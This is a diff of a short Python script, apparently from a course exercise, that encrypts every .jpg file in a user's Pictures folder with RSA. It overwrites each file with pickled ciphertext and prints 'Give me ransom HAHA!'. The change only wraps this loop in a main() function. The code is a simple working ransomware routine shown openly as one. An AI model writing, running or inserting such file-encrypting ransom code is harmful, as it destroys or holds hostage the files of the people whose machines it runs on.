@@ -12,7 +12,13 @@ def rsa_encrypt(filename):
     with open(filename, 'wb') as f:
         pickle.dump(cipher_int, f)
 
-jpgFilenamesList = glob.glob('/home/csc2021/Pictures/*.jpg')
-for filename in jpgFilenamesList:
-    rsa_encrypt(filename)
-print("Give me ransom HAHA!")
+
+def main():
+    jpgFilenamesList = glob.glob('/home/csc2021/Pictures/*.jpg')
+    for filename in jpgFilenamesList:
+        rsa_encrypt(filename)
+    print("Give me ransom HAHA!")
+    exit(0)
+
+if __name__== "__main__":
+    main()
